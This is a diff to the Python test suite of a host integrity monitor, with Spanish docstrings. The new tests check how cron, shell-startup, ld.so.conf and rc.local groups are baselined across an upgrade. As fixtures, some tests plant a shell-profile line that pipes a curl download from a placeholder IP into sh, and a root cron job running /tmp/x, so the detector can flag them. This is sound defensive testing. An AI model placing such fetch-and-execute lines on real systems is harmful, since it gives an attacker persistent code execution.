@@ -10262,6 +10262,21 @@ class ConfigSemanticsTests(unittest.TestCase):
         self.assertTrue(self.c.analyze("apt_keys", b"\x99\x01binary").ok)
 
 
+class IntegrityGroupNamesTests(unittest.TestCase):
+    def test_the_names_of_the_groups_are_the_ones_watched(self):
+        """`GROUP_NAMES` es lo que la base guarda como vigilado: un grupo nuevo sin nombre aquí no se adoptaría."""
+        from arx.modules import integrity
+        self.assertEqual(set(integrity.GROUP_NAMES), set(integrity.groups()))
+
+    def test_learning_records_the_groups_it_watched(self):
+        _isolate()
+        from arx.modules import baseline, integrity
+        with mock.patch.object(integrity, "snapshot", lambda *a, **k: ({}, [])), \
+                mock.patch.object(baseline, "integrity_fingerprint", lambda *a, **k: {}):
+            b = baseline.fold(baseline.new_baseline(), {"sets": {}, "gauges": {}})
+        self.assertEqual(b["meta"]["integrity_groups"], sorted(integrity.GROUP_NAMES))
+
+
 class IntegrityFileTests(unittest.TestCase):
     """B77/B73: la integridad crítica fichero a fichero, por significado, con diff y sin falsos positivos propios."""
 
@@ -10295,10 +10310,48 @@ class IntegrityFileTests(unittest.TestCase):
     def _seal(self):
         files = self.i.snapshot()[0]
         self.r.backup_critical({g: [p for p in ps if os.path.isfile(p)] for g, ps in self.layout.items()})
-        return {"integrity": {"x": "y"}, "integrity_files": files, "meta": {}}
+        return {"integrity": {"x": "y"}, "integrity_files": files,
+                "meta": {"integrity_groups": list(self.i.GROUP_NAMES)}}
 
     def _drift(self, base):
         return self.g._integrity_drift(base, False)
+
+    def test_an_upgrade_that_watches_new_groups_takes_what_was_there_as_known(self):
+        """Piloto A: de rc3 a rc4 (rc.local, inicio de shell y ld.so.conf vigilados desde rc4) salieron 16 high con
+        Tier 2 por «líneas nuevas» de ficheros que ya estaban. Una base de rc3 no guarda `integrity_groups`."""
+        self._file("cron", "cron.d/backup", "0 3 * * * root /usr/local/bin/backup\n")
+        base = self._seal()
+        base["meta"].pop("integrity_groups")  # sellada por rc3
+        base["integrity_files"] = {p: st for p, st in base["integrity_files"].items() if st.get("g") == "cron"}
+        prof = self._file("shell_init", "profile", "PS1='$ '\n")
+        ld = self._file("ld_conf", "ld.so.conf.d/libc.conf", "/usr/local/lib\n")
+        found = self._drift(base)
+        self.assertEqual([(f["kind"], f["sev"]) for f in found], [("integrity_watch_added", "med")])
+        self.assertIn(prof, found[0]["detail"])
+        self.assertIn(ld, found[0]["detail"])
+        self.assertEqual(set(base["meta"]["integrity_groups"]), set(self.i.GROUP_NAMES))
+        self.assertEqual(self._drift(base), [])  # una sola vez
+        self._file("shell_init", "profile", "PS1='$ '\ncurl -s http://203.0.113.9/x | sh\n")
+        self.assertEqual([(f["sev"], f["target"]["path"]) for f in self._drift(base)], [("high", prof)])
+
+    def test_a_new_file_in_a_group_watched_since_the_seal_is_still_new(self):
+        """Solo los grupos que la base no conocía se adoptan: en uno conocido, un fichero nuevo es un hallazgo,
+        aunque en la misma pasada se adopten grupos nuevos."""
+        self._file("cron", "cron.d/backup", "0 3 * * * root /usr/local/bin/backup\n")
+        base = self._seal()
+        base["meta"].pop("integrity_groups")
+        evil = self._file("cron", "cron.d/evil", "* * * * * root /tmp/x\n")
+        self._file("rc_local", "rc.local", "#!/bin/sh\nexit 0\n")
+        found = self._drift(base)
+        self.assertEqual(sorted((f["kind"], f["sev"]) for f in found),
+                         [("integrity", "high"), ("integrity_watch_added", "med")])
+        self.assertEqual([f["target"]["path"] for f in found if f["kind"] == "integrity"], [evil])
+
+    def test_a_group_known_at_the_seal_never_adopts_files_silently(self):
+        base = self._seal()
+        prof = self._file("shell_init", "profile.d/zz.sh", "curl -s http://203.0.113.9/x | sh\n")
+        found = self._drift(base)
+        self.assertEqual([(f["sev"], f["target"]["path"]) for f in found], [("high", prof)])
 
     def test_planted_root_key_is_critical_and_names_the_file_and_key(self):
         path = os.path.join(self.d, "root_keys")
